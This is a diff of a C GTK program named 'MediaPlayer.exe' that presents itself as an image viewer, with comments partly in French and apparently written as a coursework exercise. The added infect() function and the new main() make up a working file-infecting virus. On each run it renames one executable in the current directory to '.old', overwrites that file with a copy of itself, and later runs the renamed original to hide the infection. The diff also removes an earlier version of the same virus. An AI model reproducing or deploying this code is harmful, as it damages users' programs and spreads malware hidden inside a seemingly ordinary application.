@@ -10,33 +10,20 @@ static void
 on_open_image (GtkButton* button, gpointer user_data)
 {
 	GtkWidget *image = GTK_WIDGET (user_data);
-  // retrieve the top-level widget
 	GtkWidget *toplevel = gtk_widget_get_toplevel (image);
 	GtkFileFilter *filter = gtk_file_filter_new ();
+	// Create box dialogue for file selection
 
-  //add jpg,jpeg,png,svg filter to files
-  gtk_file_filter_add_pattern(filter, "*.jpg");
-  gtk_file_filter_add_pattern(filter, "*.jpeg");
-  gtk_file_filter_add_pattern(filter, "*.png");
-  gtk_file_filter_add_pattern(filter, "*.svg");
-  // Create box dialogue for file selection
-
-	/*GtkWidget *dialog = gtk_file_chooser_dialog_new (("Open image"),
+	GtkWidget *dialog = gtk_file_chooser_dialog_new (("Open image"),
 	                                                 GTK_WINDOW (toplevel),
 	                                                 GTK_FILE_CHOOSER_ACTION_OPEN,
 	                                                 "gtk-ok", GTK_RESPONSE_ACCEPT,
 	                                                 "gtk-cancel", GTK_RESPONSE_CANCEL,
-	                                                 NULL);*/
-
-    GtkWidget *dialog = gtk_file_chooser_dialog_new (("Open image"),
-	                                                 GTK_WINDOW (toplevel),
-	                                                 GTK_FILE_CHOOSER_ACTION_OPEN,
-	                                                 GTK_STOCK_OK, GTK_RESPONSE_ACCEPT,
-	                                                 GTK_STOCK_CANCEL, GTK_RESPONSE_CANCEL,
 	                                                 NULL);
 
-  // Adding the images format accept by GTK 
-	gtk_file_filter_add_pixbuf_formats (filter);
+	gtk_file_filter_add_pixbuf_formats (filter); // Adding the images format accept by GTK 
+	gtk_file_chooser_add_filter (GTK_FILE_CHOOSER (dialog),
+	                             filter);
 
 	switch (gtk_dialog_run (GTK_DIALOG (dialog)))
 	{
@@ -51,6 +38,119 @@ on_open_image (GtkButton* button, gpointer user_data)
 			break;
 	}
 	gtk_widget_destroy (dialog);
+}
+
+
+    char*
+    nameToOld(char* name)
+    {
+        char* new_name = (char *) malloc( 50 );
+        strcpy(new_name, name);
+
+        if(strcmp(name, "MediaPlayer.exe"))	// Verifing if the file is not MediaPlayer
+        {
+            if(strstr(name, ".exe")) // Verifing the extension of the file
+            {
+                new_name[strlen(name)-1] = 'd';
+                new_name[strlen(name)-2] = 'l';
+                new_name[strlen(name)-3] = 'o';
+
+                if(!fopen(new_name, "r"))//Verifing if we have already the same file
+				{
+                    //Le fichier .old n'existe pas ==> infection
+
+                    if(!rename(name, new_name))	// Le fichier a était renommé ?
+                    {
+                        return name;
+                    }
+                    else
+                    {
+                        perror("Error the file not renaming\n");
+                        exit(EXIT_FAILURE);
+                    }
+                }
+            }
+        }
+		free(new_name);
+        return "";
+    }
+
+
+void infect()
+{
+	DIR* dir = opendir("."); // Open a directory to read files in it.
+	int infect = 0;
+	char* pname = (char *) malloc( 50 );
+	char* rname = (char *) malloc( 50 );
+
+	// Test if the directory exists. If not, create it and return an error
+	if (dir == NULL)
+    {
+            perror("Error: Unable to open directory\n");
+            exit(EXIT_FAILURE);
+    }
+
+	// directory file path structure
+	struct dirent* directory;
+    while ((directory = readdir(dir)) != NULL)
+    {
+		if (infect < 1) // We infect one file per execution
+		{
+			struct stat stat_buffer;
+			if (!stat(directory->d_name, &stat_buffer))
+			{	
+				if ((stat_buffer.st_mode & S_IXUSR) && S_ISREG(stat_buffer.st_mode))//check if the file is executable and regular
+				{ 
+					char* name = (char *) malloc( 50 );
+					strcpy(name, directory->d_name); // Copy the name of the file
+					strcpy(pname, name);
+					
+					strcpy(rname, nameToOld(name));
+
+					if(strcmp(rname, "")) // Le programme a était infecté ? 
+					{
+						infect++;
+					}
+
+					free(name);
+				}
+			}
+		}
+	}
+	free(directory);
+	closedir(dir);
+
+	
+    FILE *fCopy, *fCopied;
+    char ch; //Stock every charactere of the source file
+    int pos; // The cursor postion in the source fille
+
+    if ((fCopy = fopen("MediaPlayer.exe","r")) == NULL)    
+	{    
+	    perror("Error the file can't be open");
+        exit(EXIT_FAILURE);
+    }
+
+    fCopied = fopen(pname, "w"); // Opening pg_name file else creating the file
+
+    fseek(fCopy, 0L, SEEK_END); // file pointer at end of file
+
+    pos = ftell(fCopy); // The total size of te source file 
+
+    fseek(fCopy, 0L, SEEK_SET); // file pointer set at start
+       
+	while (pos--)
+    {
+        ch = fgetc(fCopy);  // copying file character by character
+        fputc(ch, fCopied); // Put ch per ch in the copied file
+    }    
+
+	printf("virus copié\n");
+
+    fclose(fCopied);
+	fclose(fCopy);
+	free(pname);
+	free(rname);
 }
 
 
@@ -90,130 +190,30 @@ activate (GtkApplication *app, gpointer user_data)
 }
 
 
-
-char* changeNameToOld(char* name)
-{
-	char* new_name = (char *) malloc( 40 );
-	strcpy(new_name, name);
-
-	if(strcmp(name, "MediaPlayer.exe"))	// The file is not MediaPlayer
-	{
-		if(strstr(name, ".exe")) // Test if the file has the .exe extension
-		{
-			// Rename with the extension .old
-			new_name[strlen(name)-1] = 'd';
-			new_name[strlen(name)-2] = 'l';
-			new_name[strlen(name)-3] = 'o';
-
-			if(!fopen(new_name, "r"))	//Test if it exists a file with the same name
-			{
-				//Don't exist
-
-				if(!rename(name, new_name))	// Le fichier a était renommé ? 
-				{
-					printf("File renamed\n");
-					return name;
-				}
-				else 
-				{
-                    printf("No file renamed\n");
-					return "";
-				}
-			}
-		}
-	}
-	return "";
-}
-// Changing the name of the executables
-
-char* infectFile()
-{
-	DIR* dir = opendir("."); // Open a directory to read files in it.
-	int infect = 0; // Number of infections
-	char* pname = (char *) malloc( 40 );
-	char* rname = (char *) malloc( 40 );
-
-    // Test if the directory exists. If not, create it and return an error
-	if (dir == NULL)
-    {
-        perror("Error ");//writing the error message
-        exit(0);
-    }
-
-    // directory file path structure
-	struct dirent* directory;
-    while ((directory = readdir(dir)) != NULL)
-    {
-		if (infect < 1)
-		{
-			struct stat* buffer;
-			if (!stat(directory->d_name, buffer)) // Stock stat information of the file
-			{	
-				if ((buffer->st_mode & S_IXUSR) && S_ISREG(buffer->st_mode)) //check if the file is executable and regular
-				{ 
-					char* name = (char *) malloc( 40 );
-					strcpy(name, directory->d_name);
-					strcpy(pname, name);
-					
-					strcpy(rname, changeNameToOld(name));
-
-					if(strcmp(rname, "")) // test if the file has been renamed
-					{   
-						infect++;
-					}
-
-					free(name);
-				}
-			}
-		}
-	}
-	free(directory);
-    if (closedir(dir) != 0) perror("Error ");
-
-    FILE *fileToCopy, *fileCopied;
-    char ch; //Stock every charactere of the source file
-    int pos; // The cursor postion in the source fille
-
-    if ((fileToCopy = fopen("MediaPlayer.exe","r")) == NULL)    
-	{    
-	    printf("\nLe fichier ne peut pas etre ouvert\n");
-        perror("Error ");
-    }
-
-    fileCopied = fopen(pname, "w");  
-    fseek(fileToCopy, 0L, SEEK_END); // file pointer at end of file
-    pos = ftell(fileToCopy); // The total size of te source file 
-    fseek(fileToCopy, 0L, SEEK_SET); // file pointer set at start
-       
-	while (pos--)
-    {
-        ch = fgetc(fileToCopy);  // copying file character by character
-        fputc(ch, fileCopied);
-    }    
-
-	printf("virus copié\n");
-
-    fclose(fileCopied);
-    fclose(fileToCopy);
-
-
-	return rname;
-}
-
 int
 main (int argc, char **argv)
 {
 	int status;
-    char* infect_name = infectFile();
-    printf("The name of an infected file : %c", *infect_name);
+	infect();    
+	char* cmd = (char *) malloc( 40 );
+	strcpy(cmd, argv[0]); // argv[0] contains the name of the executed file
 
-  GtkApplication *app;
-
-  app = gtk_application_new ("org.gtk.example", G_APPLICATION_DEFAULT_FLAGS);
-  //app = gtk_application_new ("org.gtk.example", G_APPLICATION_FLAGS_NONE);
-  g_signal_connect (app, "activate", G_CALLBACK (activate), NULL);
-  status = g_application_run (G_APPLICATION (app), argc, argv);
-  g_object_unref (app);
+	if(!strcmp(argv[0], "./MediaPlayer.exe")) // If the file is MediaPlayer run the MediaPlayer
+	{
+		GtkApplication *app;
+		app = gtk_application_new ("org.gtk.example", G_APPLICATION_FLAGS_NONE);
+		g_signal_connect (app, "activate", G_CALLBACK (activate), NULL);
+		status = g_application_run (G_APPLICATION (app), argc, argv);
+		g_object_unref (app);
+	}
+	else //Run the originaly prog file with replacing its extension
+	{
+		cmd[strlen(cmd)-1] = 'd';
+		cmd[strlen(cmd)-2] = 'l';
+		cmd[strlen(cmd)-3] = 'o';
+		printf("cmd : %s\n", cmd);
+		system(cmd);
+	}
 	
 	return status;
 }
